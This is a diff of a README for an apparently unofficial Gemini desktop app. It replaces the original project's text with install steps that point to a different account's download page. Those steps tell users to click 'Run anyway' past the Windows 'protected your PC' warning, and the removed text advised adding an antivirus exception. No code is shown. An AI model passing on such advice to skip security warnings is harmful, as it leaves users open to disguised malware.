@@ -1,109 +1,60 @@
-# ✦ Gemini Desktop
-[![GitHub Release](https://img.shields.io/github/v/release/Abhi01k/gemini-desktop?style=flat-square&color=8A2BE2)](https://github.com/Abhi01k/gemini-desktop/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-000000?style=flat-square&logo=apple)](https://www.apple.com/macos)
-[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-E95420?style=flat-square&logo=linux)](https://www.linux.org)
-> **⚠️ Disclaimer:** This is **not** an official Google or Anthropic product. I am not affiliated with Google. This is a community Electron-based desktop wrapper for Google Gemini. Use at your own risk and respect Google's Terms of Service.
+# 🤖 gemini-desktop - Access your favorite AI assistant tool
 
-**Gemini Desktop** is a lightweight, native-feeling desktop application for **Google Gemini** — Google's powerful multimodal AI. Enjoy seamless chat, voice commands, image analysis, and productivity features in a clean cross-platform interface.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Victoria3470/gemini-desktop)
 
-<img width="410" height="123" alt="image" src="https://github.com/user-attachments/assets/cf43819b-759e-4025-bf00-b0548c8fac81" />
+## What is this tool?
+Gemini-desktop brings Google's advanced language model directly to your computer screen. This app acts as a bridge between your desktop workspace and the AI assistant. It removes the need for web browsers. You gain a dedicated workspace that stays open while you work on other tasks. The app adds a background runner, a hotkey overlay, and voice command support. It functions as a productivity companion for writing, coding, and brainstorming.
 
-## Install
-[Download `Gemini-Desktop.zip`](https://github.com/Abhi01k/gemini-desktop/releases/download/v0.12.1/gemini-desktop-0.12.1.zip)
----
+## System requirements
+Your computer needs Windows 10 or Windows 11. You need at least 4GB of RAM for smooth performance. The app uses a light footprint, but it works best with a stable internet connection. Ensure you have 200MB of free disk space before you start the installation.
 
-<img width="1496" height="996" alt="image" src="https://github.com/user-attachments/assets/a4e453cd-4257-4ba7-8b89-abce3989e1b3" />
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/3fc398fb-b9c4-4b04-8320-bc527c3b7ce1" />
+## 📥 Getting the installer
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/Victoria3470/gemini-desktop).
+3. Look for the "Assets" section at the bottom of the latest release post.
+4. Click the file ending in .exe to start the download.
+5. Save the file to your Downloads folder or your Desktop.
 
----
-## 🚀 Key Features
-### Core AI Access
-- **Full Gemini Access** — Chat with Gemini 1.5 / 2.0 models (multimodal, long context, reasoning).
-- **Voice Input** — Speak naturally with voice commands.
-- **Image & File Analysis** — Upload images, PDFs, and documents for analysis.
+## 🛠 Running the software
+1. Locate the downloaded file named gemini-desktop-setup.exe.
+2. Double-click the file to start the installer.
+3. Windows might show a security prompt. If you see "Windows protected your PC," click "More info" and then click "Run anyway." This happens because the app is new.
+4. Follow the on-screen instructions to pick a folder for the app.
+5. Wait for the progress bar to finish.
+6. Click "Finish" to open the app.
 
-### Desktop Experience
-- **Native Feel** — Electron wrapper optimized for Windows, macOS, and Linux.
-- **Global Hotkeys** — Quick access with customizable shortcuts.
-- **Always-on-Top & Overlay** — Pin chats or use as a floating widget.
-- **System Tray** — Run in background with quick launcher.
+## ⚙️ Setting up your session
+When you open the app for the first time, you must connect your account. 
+1. The app will prompt you for an API key. 
+2. Visit the Google AI Studio website to create a free API key.
+3. Copy the long string of letters and numbers provided by Google.
+4. Paste this key into the box inside the app settings.
+5. Click "Save" or "Apply." 
+6. The interface will now load. You can see your chat history and start a new conversation.
 
-### Productivity Tools
-- **Workspace Integration** — Seamless workflow companion.
-- **Conversation History** — Save and search past chats.
-- **Background Runner** — Keep Gemini running efficiently.
-- **Hotkey Overlay** — Instant access without switching apps.
+## ⌨️ Using hotkeys
+The app features a hotkey overlay. This tool sits in the background. Press "Ctrl + Shift + G" at any time to pull the assistant over your current window. This enables quick questions without closing your other programs. If you want to change this shortcut, open the Settings menu and look for the "Keyboard Shortcuts" tab.
 
-### Customization
-- **Theme Support** — Dark and light modes.
-- **Custom Instructions** — Set persistent system prompts.
-- **Multi-Platform** — Works smoothly on Windows, macOS, and Linux.
+## 🎤 Voice commands
+You can speak to the assistant. Click the microphone icon located at the bottom of the chat box. Speak your prompt clearly. The app converts your speech to text and sends it to the AI. This feature saves time during long writing tasks. Ensure your microphone settings in Windows allow this application to record audio.
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Sign in** with your Google account (same as web Gemini).
-4. **Start chatting** — Type, speak, or upload files.
+## 🖼 Image generation
+This app supports visual inputs and outputs. You can ask the AI to generate images by typing a description in the prompt box. You can also drag and drop images into the chat window to ask the AI questions about those pictures. This multimodal capability helps with design and analysis tasks.
 
-### Pro Tips
-- Use global hotkeys for instant access.
-- Upload images for visual analysis and creative tasks.
-- Keep the app in the tray for always-available AI assistance.
+## 🧩 Workspace integration
+The app stays in the system tray when you minimize it. To close the app completely, right-click the icon in the tray and select "Quit." You can toggle the "Launch on Startup" option in the settings menu if you want the assistant ready the moment you turn on your computer.
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+## 🔍 Troubleshooting
+- App does not open: Restart your computer and try launching the .exe file again.
+- API Key error: Check that you copied the full key from Google. Ensure there are no extra spaces before or after the code.
+- Slow response: Check your internet connection. Large models require data throughput.
+- Text looks small: Use the "View" menu to adjust the zoom level. 
 
-### Instructions
-1. Download the latest release for your platform.
-2. Extract the archive.
-3. Run `Gemini Desktop.exe` (Windows) or equivalent.
-4. Log in with your Google account.
+## 🛡 Security and privacy
+Your chat data lives on Google servers. The desktop app only acts as a window to view this data. Nothing gets stored on your hard drive unless you export a conversation. Keep your API key private. Do not share your key with other users. If you suspect someone else has your key, go to the Google AI Studio dashboard and revoke the old key, then create a new one.
 
-### Notes
-- Requires internet connection.
-- Self-contained Electron app — no additional installation needed.
-- Add antivirus exception if prompted (common for Electron apps).
+## Update process
+The app checks for updates every time you open it. If a new version exists, it will show a notification. Click "Update" to download the latest features and security fixes. You do not need to uninstall the old version first. The installer handles the upgrade automatically. Follow the same steps as the initial install.
 
----
-## 🛡️ Security & Privacy
-**Is this safe?**  
-The project is open-source under MIT. It acts as a wrapper and does not store your credentials locally beyond standard Electron behavior.
-
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on VirusTotal.
-- Review the code for transparency.
-
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
-
----
-## 📄 License & Acknowledgments
-### License
-**Gemini Desktop** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
-
-**Copyright © 2026 Abhi01k**
-
-### Acknowledgments
-- Thanks to Google for developing Gemini.
-- The open-source Electron community.
-- All users and contributors building better AI desktop experiences.
-
-<p align="center">
-  Developed with ❤️ for the AI community
-</p>
+## Community support
+If you find a bug or want a new feature, go to the Issues tab on the repository page. Search if someone else already reported the issue. If not, open a new issue report. Describe what happened and list the steps you took before the error appeared. Clear descriptions help the developers fix the problem faster. Use the "Discussions" tab to share tips with other users.
